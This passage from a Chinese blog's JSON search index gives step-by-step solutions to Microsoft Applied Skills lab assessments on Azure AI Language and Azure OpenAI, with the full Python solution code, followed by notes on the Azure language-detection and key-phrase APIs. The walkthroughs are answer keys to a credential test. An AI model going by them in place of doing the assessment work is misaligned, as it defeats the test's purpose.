Submit 按钮。\n证书\nEnd\n","permalink":"https://qfsyso.github.io/posts/azure-openai-build-natural-language/","summary":"https://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment?ocid=reactor\nstart 进入环境中，点击Step 1，然后点击Password右边的T，登录环境 双击打开桌面的Email文件 对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，proof of concept、Invoice validation、chatbot backend 分别表示的是本次考试的三大任务的具体要求 将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录\n试验一： Proof of Concept (POC) 点击邮件中的 Proof of Concept (POC) 菜单会出现具体的内容要求，如下图所示。\n在第一个实验中主要是使用微软的 language 服务，并且创建的时候要符合要求，这个服务要满足客户自定义文本标准和 NER。 在实验中另外一个要求是需要使用代码最后调用这个你创建服务。 流程操作 首先在登录主页面搜索栏 搜索RG1，并点击Resource Groups下面的RG1 进入后点击 Create 按钮 之后在首页内搜索language service 点击进入到 Language service 后，点击 Create 之后点击右下方的第二个 select 按钮 选择好之后，点击下方的按钮 continue to create your resource\n在配置页面，按照我们的题目要求，在 Region 中选择 North Europe， 其中 Name 从邮件中找，在 Proof of concept 这里 lang开头的这个名字，作为刚才创建资源的 Name 值 主要需要注意的是在 Pricing tier层里，需要选择 Free F0 的这个，这一点也是题目要求的。 下面选择 Existing storege account ，在存储账户这里，需要选择题目要求的以sa开头的这个账户。","title":"Azure OpenAI Build Natural Language"},{"content":"Start https://learn.microsoft.com/en-us/credentials/applied-skills/develop-generative-ai-solutions-with-azure-openai-service/#applied-skill-take-the-assessment\n部署Azure OpenAI 服务 ​\n点击Step 1，然后点击Password右边的T ​\n鼠标双击Email ​ 对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，Validate proof of concept、Company chatbot、Developer tasks和Use company data分别表示的是本次考试的四大任务的具体要求\n切换到Azure登录的标签页\n​ 将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录\n然后在浏览器中输入URL：https://portal.azure.com/#home，点击Azure AI services\n​ 其中Resource group、Pricing tier勾选下拉列表的存在项，Name可自行填入(如azureservice)，然后点击Next ​\n网络中选择第一项：All networks，然后点击页面左下方的Next Tags可直接点击左下方的Next 然后在Review+submit页面点击Create ​ 等待几十秒后，deployment完成后，点击Deployment details 点击Resource中的名称，如azureservice ​ 点击Endpoints右边的Click here to view endpoints ​ ​\n点击Key 1右侧的复制按钮，复制其到C:\\files\\AzureOpenAIPoc\\Python.env中的AZURE_OAI_KEY变量中。 点击Endpoint右侧的复制按钮，分别复制任意一个 KEY 和 EndPoint 到C:\\files\\AzureOpenAIPoc\\Python.env中的AZURE_OAI_KEY 和 AZURE_OAI_ENDPOINT。 然后在浏览器中输入https://portal.azure.com/#home，并点击Name下的名称 点击Go to Azure OpenAI Studio\n然后点击Create new deployment\n按照下图中的内容进行下拉选择或者填写，其中Select a model勾选为gpt-35-turbo-16k，Deployment name可自定义填写，如gpt_deploy，将Tokens per Minute Rate Limit设置为5K，Enable Dynamic Quota设置为Disabled，最后点击Create： 确保Status为Succeed，则说明部署成功了 将C:\\files\\AzureOpenAIPoc\\Python.env中AZURE_OAI_MODEL设置为Deployment name，如gpt_deploy AI Search相关操作 然后在浏览器中输入https://portal.azure.com/#home，在输入框中输入ai search，点击AI Search 点击Name下的名称\n点击Import data\n在Connect to your data中勾选Data Source为Azure Blob Storage 点击Name下的名称 选择blob1，并点击Select\n填入azure，并点击左下方的Next：Add cognitive skills： 在Add cognitive skills中点击Skip to: Customize target index 修改index name为pocindex，然后点击Next: Create an indexe 修改Indexer的Name为pocindex，然后点击Submit 复制其 url 作为C:\\files\\AzureOpenAIPoc\\Python.env中的值SEARCH_ENDPOINT\n点击Essentials左边的箭头收起该部分内容，然后点击Properties，再点击API keys\n然后点击Primary admin keys中的复制按钮，复制其到C:\\files\\AzureOpenAIPoc\\Python.env中的SEARCH_KEY变量中。 修改其中SEARCH_INDEX为pocindex\n修改后完整的.env内容如下所示，写改完后记得保存并关闭\n修改PoC.py文件 具体路径为：C:\\files\\AzureOpenAIPoc\\Python\\PoC.py。打开文件的方法可参考部署Azure OpenAI服务中的.env文件，唯一差别之处在于PoC.py可双击打开。需要说明的是：粘贴后记得按下ctrl+s进行保存\nimport os import requests from dotenv import load_dotenv import utils from openai import AzureOpenAI import asyncio from openai import AsyncAzureOpenAI # Add OpenAI import. (Add code here) def main(): try: load_dotenv() utils.initLogFile() azure_oai_endpoint = os.getenv(\u0026#34;AZURE_OAI_ENDPOINT\u0026#34;) azure_oai_key = os.getenv(\u0026#34;AZURE_OAI_KEY\u0026#34;) azure_oai_model = os.getenv(\u0026#34;AZURE_OAI_MODEL\u0026#34;) # Define Azure OpenAI client (Add code here)################## client = AzureOpenAI( azure_endpoint=azure_oai_endpoint, api_key=azure_oai_key, api_version=\u0026#34;2024-02-15-preview\u0026#34; ) function_map = { \u0026#34;1\u0026#34;: function1, \u0026#34;2\u0026#34;: function2, \u0026#34;3\u0026#34;: function3, \u0026#34;4\u0026#34;: function4 } while True: print(\u0026#39;1: Validate PoC\\n\u0026#39; + \u0026#39;2: Company chatbot\\n\u0026#39; + \u0026#39;3: Developer tasks\\n\u0026#39; + \u0026#39;4: Use company data\\n\u0026#39; + \u0026#39;\\\u0026#39;quit\\\u0026#39; to exit the program\\n\u0026#39;) command = input(\u0026#39;Enter a number:\u0026#39;) if command.strip() in function_map: function_map[command](client, azure_oai_model) elif command.strip().lower() == \u0026#39;quit\u0026#39;: print(\u0026#39;Exiting program...\u0026#39;) break else: print(\u0026#34;Invalid input. Please enter number 1, 2, 3, 4, or 5.\u0026#34;) except Exception as ex: print(ex) # Task 1: Validate PoC def function1(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 1: Validate PoC\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) # Build messages to send to Azure OpenAI model. (Add code here) messages = [ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: inputText} ] # Define argument list (Add code here) apiParams = { \u0026#34;messages\u0026#34;: messages, } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create( model=aiModel, messages=messages, temperature=0.7, max_tokens=800 ) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return response # Task 2: Company chatbot def function2(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 2: Company chatbot\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant that responds in a casual tone. Each response should end with \u0026#39;Hope that helps! Thanks for using Contoso, Ltd.\u0026#39;\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;What is the best way to find if a company is hiring?\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You can start by checking the company\u0026#39;s website, especially the careers section. Hope that helps! Thanks for using Contoso, Ltd.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: inputText} ] # Define argument list (Add code here) apiParams = { \u0026#34;model\u0026#34;: aiModel, \u0026#34;messages\u0026#34;: messages, \u0026#34;max_tokens\u0026#34;: 1000, \u0026#34;temperature\u0026#34;: 0.5 } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return response # Task 3: Developer tasks def function3(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 3: Developer tasks\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) # Define system message based on the task system_message = \u0026#34;Take the legacy code in legacyCode.py, add comments and generate documentation.\u0026#34; messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: system_message}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: inputText} ] # Define argument list (Add code here) apiParams = { \u0026#34;model\u0026#34;: aiModel, \u0026#34;messages\u0026#34;: messages, \u0026#34;max_tokens\u0026#34;: 1000, \u0026#34;temperature\u0026#34;: 0.5 } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return response # Task 4: Use company data def function4(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 4: Use company data\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) # Build messages to send to Azure OpenAI model. (Add code here) search_endpoint = os.getenv(\u0026#34;SEARCH_ENDPOINT\u0026#34;) search_key = os.getenv(\u0026#34;SEARCH_KEY\u0026#34;) search_index = os.getenv(\u0026#34;SEARCH_INDEX\u0026#34;) # Perform the search query search_query = { \u0026#34;search\u0026#34;: inputText, \u0026#34;searchMode\u0026#34;: \u0026#34;any\u0026#34;, \u0026#34;queryType\u0026#34;: \u0026#34;simple\u0026#34;, \u0026#34;top\u0026#34;: 5 # Adjust the number of results as needed } headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;api-key\u0026#34;: search_key } search_url = f\u0026#34;{search_endpoint}/indexes/{search_index}/docs/search?api-version=2021-04-30-Preview\u0026#34; response = requests.post(search_url, headers=headers, json=search_query) search_results = response.json() # Extract relevant search results search_snippets = [result[\u0026#34;content\u0026#34;] for result in search_results[\u0026#34;value\u0026#34;]] search_content = \u0026#34;\\n\\n\u0026#34;.join(search_snippets) # Build messages for OpenAI with search results included messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful travel agent.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: f\u0026#34;{inputText}\\n\\nSearch Results:\\n{search_content}\u0026#34;} ] # Define connection and argument list (Add code here) apiParams = { \u0026#34;model\u0026#34;: aiModel, \u0026#34;messages\u0026#34;: messages, \u0026#34;max_tokens\u0026#34;: 1000, \u0026#34;temperature\u0026#34;: 0.5 } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. Will be the same as function1 (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return # Call main function. Do not modify. if __name__ == \u0026#39;__main__\u0026#39;: main() 将上述修改后的代码复制到C:\\files\\AzureOpenAIPoc\\Python\\PoC.py中，打开文件方法较为简单，即通过鼠标双击也就是通过VScode工具打开该文件 可使用ctrl+a删除全部内容，然后再通过ctrl+c和ctrl+v进行复制，接着按ctrl+s进行保存，最后在地址栏删除已有内容，并在其中输入cmd，并按下回车键\n进入到cmd中后，输入python PoC.py，每输入完一个命令按回车代表执行该命令 然后可输入题号，比如 输入1 代表的是第一个题(Validate PoC)，然后可输入type或者file，其中type指的是自行输入prompt，而file是从目录下的sample-text.txt读取得到输入prompt。需要说明的是，可连续进行提问，不需要中间退出。\n第一题 第一题可依次输入type、who are you(或者其它prompt)进行提问或者直接输入file进行提问。查看结果是否正常输出。\n第二题 第二题可依次输入type、who are you来进行提问，或者依次输入type和其他问题。查看是否以Hope that helps!Thanks for using Contoso,Ltd.结尾。 然后再在第二题中输入type和Get the response in both English and Spanish: what is the best way to find if a company is hiring?(可直接ctrl+c、ctrl+v进行复制)进行提问\n第三题 第三题需要复制并运行文件两次，具体来说： 第一次 是将c:\\files下的legacyCode.py复制到C:\\files\\AzureOpenAIPoc\\Python 路径下，首先删除文件夹中已有的sample-text.txt，并将legacyCode.py重命名为sample-text.txt(！！！注意是sample-text.txt，而不是sample-text.py)。然后运行python PoC.py，并输入3 和 file，查看结果是否产生了注释。\n第二次需将PoC.py文件进行复制粘贴为以下内容，并按下ctrl+s进行保存 import os import requests from dotenv import load_dotenv import utils from openai import AzureOpenAI import asyncio from openai import AsyncAzureOpenAI # Add OpenAI import. (Add code here) def main(): try: load_dotenv() utils.initLogFile() azure_oai_endpoint = os.getenv(\u0026#34;AZURE_OAI_ENDPOINT\u0026#34;) azure_oai_key = os.getenv(\u0026#34;AZURE_OAI_KEY\u0026#34;) azure_oai_model = os.getenv(\u0026#34;AZURE_OAI_MODEL\u0026#34;) # Define Azure OpenAI client (Add code here)################## client = AzureOpenAI( azure_endpoint=azure_oai_endpoint, api_key=azure_oai_key, api_version=\u0026#34;2024-02-15-preview\u0026#34; ) function_map = { \u0026#34;1\u0026#34;: function1, \u0026#34;2\u0026#34;: function2, \u0026#34;3\u0026#34;: function3, \u0026#34;4\u0026#34;: function4 } while True: print(\u0026#39;1: Validate PoC\\n\u0026#39; + \u0026#39;2: Company chatbot\\n\u0026#39; + \u0026#39;3: Developer tasks\\n\u0026#39; + \u0026#39;4: Use company data\\n\u0026#39; + \u0026#39;\\\u0026#39;quit\\\u0026#39; to exit the program\\n\u0026#39;) command = input(\u0026#39;Enter a number:\u0026#39;) if command.strip() in function_map: function_map[command](client, azure_oai_model) elif command.strip().lower() == \u0026#39;quit\u0026#39;: print(\u0026#39;Exiting program...\u0026#39;) break else: print(\u0026#34;Invalid input. Please enter number 1, 2, 3, 4, or 5.\u0026#34;) except Exception as ex: print(ex) # Task 1: Validate PoC def function1(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 1: Validate PoC\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) # Build messages to send to Azure OpenAI model. (Add code here) messages = [ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: inputText} ] # Define argument list (Add code here) apiParams = { \u0026#34;messages\u0026#34;: messages, } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create( model=aiModel, messages=messages, temperature=0.7, max_tokens=800 ) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return response # Task 2: Company chatbot def function2(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 2: Company chatbot\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant that responds in a casual tone. Each response should end with \u0026#39;Hope that helps! Thanks for using Contoso, Ltd.\u0026#39;\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;What is the best way to find if a company is hiring?\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You can start by checking the company\u0026#39;s website, especially the careers section. Hope that helps! Thanks for using Contoso, Ltd.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: inputText} ] # Define argument list (Add code here) apiParams = { \u0026#34;model\u0026#34;: aiModel, \u0026#34;messages\u0026#34;: messages, \u0026#34;max_tokens\u0026#34;: 1000, \u0026#34;temperature\u0026#34;: 0.5 } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return response # Task 3: Developer tasks def function3(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 3: Developer tasks\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) # Define system message based on the task system_message = \u0026#34;Generate five unit tests for the function in fibonaci.py.\u0026#34; messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: system_message}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: inputText} ] # Define argument list (Add code here) apiParams = { \u0026#34;model\u0026#34;: aiModel, \u0026#34;messages\u0026#34;: messages, \u0026#34;max_tokens\u0026#34;: 1000, \u0026#34;temperature\u0026#34;: 0.5 } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return response # Task 4: Use company data def function4(aiClient, aiModel): inputText = utils.getPromptInput(\u0026#34;Task 4: Use company data\u0026#34;, \u0026#34;sample-text.txt\u0026#34;) # Build messages to send to Azure OpenAI model. (Add code here) search_endpoint = os.getenv(\u0026#34;SEARCH_ENDPOINT\u0026#34;) search_key = os.getenv(\u0026#34;SEARCH_KEY\u0026#34;) search_index = os.getenv(\u0026#34;SEARCH_INDEX\u0026#34;) # Perform the search query search_query = { \u0026#34;search\u0026#34;: inputText, \u0026#34;searchMode\u0026#34;: \u0026#34;any\u0026#34;, \u0026#34;queryType\u0026#34;: \u0026#34;simple\u0026#34;, \u0026#34;top\u0026#34;: 5 # Adjust the number of results as needed } headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;api-key\u0026#34;: search_key } search_url = f\u0026#34;{search_endpoint}/indexes/{search_index}/docs/search?api-version=2021-04-30-Preview\u0026#34; response = requests.post(search_url, headers=headers, json=search_query) search_results = response.json() # Extract relevant search results search_snippets = [result[\u0026#34;content\u0026#34;] for result in search_results[\u0026#34;value\u0026#34;]] search_content = \u0026#34;\\n\\n\u0026#34;.join(search_snippets) # Build messages for OpenAI with search results included messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful travel agent.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: f\u0026#34;{inputText}\\n\\nSearch Results:\\n{search_content}\u0026#34;} ] # Define connection and argument list (Add code here) apiParams = { \u0026#34;model\u0026#34;: aiModel, \u0026#34;messages\u0026#34;: messages, \u0026#34;max_tokens\u0026#34;: 1000, \u0026#34;temperature\u0026#34;: 0.5 } utils.writeLog(\u0026#34;API Parameters:\\n\u0026#34;, apiParams) # Call chat completion connection. Will be the same as function1 (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(\u0026#34;Response:\\n\u0026#34;, str(response)) print(\u0026#34;Response: \u0026#34; + response.choices[0].message.content + \u0026#34;\\n\u0026#34;) return # Call main function. Do not modify. if __name__ == \u0026#39;__main__\u0026#39;: main() 然后将c:\\files下的fibonacci.py，复制到C:\\files\\AzureOpenAIPoc\\Python下，首先删除文件夹中已有的sample-text.txt，并将fibonacci.py重命名为sample-text.txt(！！！注意是sample-text.txt，而不是sample-text.py)。然后关闭原来的命令窗口，重新运行python PoC.py，并输入3、file，查看结果是否产生了5个测试用例。\n第四题（最后一题了 加油！！） 第四题可依次输入type和When is the best time to visit London?(可使用ctrl+c和ctrl+v进行复制粘贴)进行提问。\n完成上述代码测试后，点击界面右下角中的 Submit Assessment 按钮，弹出的确认页面后点击 Submit 按钮。 完成凭证 证书 ","permalink":"https://qfsyso.github.io/posts/azure-ai-develop-generative-ai-solutions/","summary":"Start https://learn.microsoft.com/en-us/credentials/applied-skills/develop-generative-ai-solutions-with-azure-openai-service/#applied-skill-take-the-assessment\n部署Azure OpenAI 服务 ​\n点击Step 1，然后点击Password右边的T ​\n鼠标双击Email ​ 对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，Validate proof of concept、Company chatbot、Developer tasks和Use company data分别表示的是本次考试的四大任务的具体要求\n切换到Azure登录的标签页\n​ 将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录\n然后在浏览器中输入URL：https://portal.azure.com/#home，点击Azure AI services\n​ 其中Resource group、Pricing tier勾选下拉列表的存在项，Name可自行填入(如azureservice)，然后点击Next ​\n网络中选择第一项：All networks，然后点击页面左下方的Next Tags可直接点击左下方的Next 然后在Review+submit页面点击Create ​ 等待几十秒后，deployment完成后，点击Deployment details 点击Resource中的名称，如azureservice ​ 点击Endpoints右边的Click here to view endpoints ​ ​\n点击Key 1右侧的复制按钮，复制其到C:\\files\\AzureOpenAIPoc\\Python.env中的AZURE_OAI_KEY变量中。 点击Endpoint右侧的复制按钮，分别复制任意一个 KEY 和 EndPoint 到C:\\files\\AzureOpenAIPoc\\Python.env中的AZURE_OAI_KEY 和 AZURE_OAI_ENDPOINT。 然后在浏览器中输入https://portal.azure.com/#home，并点击Name下的名称 点击Go to Azure OpenAI Studio\n然后点击Create new deployment\n按照下图中的内容进行下拉选择或者填写，其中Select a model勾选为gpt-35-turbo-16k，Deployment name可自定义填写，如gpt_deploy，将Tokens per Minute Rate Limit设置为5K，Enable Dynamic Quota设置为Disabled，最后点击Create： 确保Status为Succeed，则说明部署成功了 将C:\\files\\AzureOpenAIPoc\\Python.","title":"Azure AI Develop Generative AI solutions"},{"content":"使用 Azure AI 语言分析文本 每天，世界都会生成大量数据；大部分内容基于文本，其形式包括电子邮件、社交媒体文章、在线评论、业务文档等。 通过应用统计和语义模型的人工智能技术，可以创建从基于文本的数据中提取含义和见解的应用程序。\nAzure AI 语言为可轻松集成到你自己的应用程序代码中的常见文本分析技术提供 API。\n在本模块中，你将了解如何使用 Azure AI 语言执行以下操作：\n检测文本中的语言。 分析文本情绪。 提取关键短语、实体和链接实体。\n预配 Azure AI 语言资源 Azure AI 语言旨在帮助从文本中提取信息。 它提供可用于以下各项的功能：\n语言检测 - 确定编写文本所用的语言。\n关键短语提取 - 标识文本中指示要点的重要单词和短语。\n情绪分析 - 量化文本的正负面情绪程度。\n命名实体识别 - 检测对实体的引用，包括人员、位置、时间段、组织等。\n实体链接 - 通过提供指向维基百科文章的参考链接来标识特定实体。\n用于文本分析的 Azure 资源 若要使用 Azure AI 语言来分析文本，必须在 Azure 订阅中为其预配资源。\n在 Azure 订阅中预配适当的资源后，可以使用其终结点及其密钥之一从代码中调用 Azure AI 语言 API。 可以通过向 REST 接口提交 JSON 格式的请求，或者通过使用特定于编程语言的任何可用 SDK 来调用 Azure AI 语言 API。\n注意\n本模块的后续单元中的代码示例显示了与 REST 接口交换的 JSON 请求和响应。 使用 SDK 时，会通过用于封装相同数据值的适当对象和方法对 JSON 请求进行抽象。 在本模块后面的练习中，你将有机会亲自尝试使用适用于 C# 或 Python 的 SDK。\n检测语言 Azure AI 语言检测 API 会评估文本输入，并为提交的每个文档返回带有一个指示分析强度的分数的语言标识符。\n此功能对于用于收集语言未知的任意文本的内容存储非常有用。 另一种方案可能涉及聊天机器人。 如果用户使用聊天机器人启动会话，则语言检测可用于确定用户使用的语言，这样你便可以使用适当的语言配置机器人响应。\n可以解析此分析的结果，确定输入文档中使用的语言。 响应还会返回一个分数，用于反映模型的置信度（介于 0 到 1 的值）。\n语言检测可应用于文档或单个短语。 请注意，文档大小必须小于 5,120 个字符。 大小限制针对每个文档，每个集合限制为 1,000 个项 (ID)。 此处显示了可以在请求正文中向服务提交的格式正确的 JSON 有效负载的示例，包括文档的集合，其中每个文档都包含唯一 ID 以及要分析的文本。 （可选）可以提供 countryHint 以提高预测性能。\n{ \u0026#34;kind\u0026#34;: \u0026#34;LanguageDetection\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;modelVersion\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;analysisInput\u0026#34;:{ \u0026#34;documents\u0026#34;:[ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Hello world\u0026#34;, \u0026#34;countryHint\u0026#34;: \u0026#34;US\u0026#34; }, { \u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Bonjour tout le monde\u0026#34; } ] } } 服务将返回一个 JSON 响应，其中包含请求正文中每个文档的结果，包括预测到的语言以及指示预测的置信度的值。 置信度是介于 0 和 1 的值，值越接近 1 则置信度越高。 下面是映射到上述请求 JSON 的标准 JSON 响应的示例。\n{ \u0026#34;kind\u0026#34;: \u0026#34;LanguageDetectionResults\u0026#34;, \u0026#34;results\u0026#34;: { \u0026#34;documents\u0026#34;: [ { \u0026#34;detectedLanguage\u0026#34;: { \u0026#34;confidenceScore\u0026#34;: 1, \u0026#34;iso6391Name\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;English\u0026#34; }, \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;warnings\u0026#34;: [] }, { \u0026#34;detectedLanguage\u0026#34;: { \u0026#34;confidenceScore\u0026#34;: 1, \u0026#34;iso6391Name\u0026#34;: \u0026#34;fr\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;French\u0026#34; }, \u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;warnings\u0026#34;: [] } ], \u0026#34;errors\u0026#34;: [], \u0026#34;modelVersion\u0026#34;: \u0026#34;2022-10-01\u0026#34; } } 在我们的示例中，所有语言的置信度均为 1，这主要是因为文本相对简单，易于识别其语言。\n如果传入包含多语言内容的文档，该服务的行为会有所不同。 同一文档中的混合语言内容将返回内容中代表性最强但正评级较低的语言，这反映该评估的边界强度。 在以下示例中，输入中包含英语、西班牙语和法语。 分析器使用文本的统计分析来确定主要语言。\n{ \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Hello, I would like to take a class at your University. ¿Se ofrecen clases en español? Es mi primera lengua y más fácil para escribir. Que diriez-vous des cours en français?\u0026#34; } ] } 下面的示例显示了此多语言示例的响应。\n{ \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;detectedLanguage\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Spanish\u0026#34;, \u0026#34;iso6391Name\u0026#34;: \u0026#34;es\u0026#34;, \u0026#34;confidenceScore\u0026#34;: 0.9375 }, \u0026#34;warnings\u0026#34;: [] } ], \u0026#34;errors\u0026#34;: [], \u0026#34;modelVersion\u0026#34;: \u0026#34;2022-10-01\u0026#34; } 最后要考虑的是语言内容多义性的情况。 如果提交了分析器无法分析的文本内容，则可能会发生这种情况，例如由于在将文本转换为字符串变量时出现字符编码问题。 这样一来，语言名称和 ISO 代码的响应将指示 (unknown)，分数值将返回为 0。 下面的示例显示响应的外观。\n{ \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;detectedLanguage\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;(Unknown)\u0026#34;, \u0026#34;iso6391Name\u0026#34;: \u0026#34;(Unknown)\u0026#34;, \u0026#34;confidenceScore\u0026#34;: 0.0 }, \u0026#34;warnings\u0026#34;: [] } ], \u0026#34;errors\u0026#34;: [], \u0026#34;modelVersion\u0026#34;: \u0026#34;2022-10-01\u0026#34; } 提取关键短语 关键短语提取是这样一个过程，即评估一个或多个文档的文本，然后围绕文档上下文识别出要点。\n关键短语提取最适合大型文档（可分析的最大大小为 5,120 个字符）。\n与语言检测一样，使用 REST 接口可以提交一个或多个文档进行分析。\n{ \u0026#34;kind\u0026#34;: \u0026#34;KeyPhraseExtraction\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;modelVersion\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;analysisInput\u0026#34;:{ \u0026#34;documents\u0026#34;:[ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;You must be the change you wish to see in the world.\u0026#34; }, { \u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;The journey of a thousand miles begins with a single step.\u0026#34; } ] } } 响应包含在每个文档中检测到的关键短语的列表：\n{ \u0026#34;kind\u0026#34;: \u0026#34;KeyPhraseExtractionResults\u0026#34;, \u0026#34;results\u0026#34;: { \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;keyPhrases\u0026#34;: [ \u0026#34;change\u0026#34;, \u0026#34;world\u0026#34; ], \u0026#34;warnings\u0026#34;: [] }, { 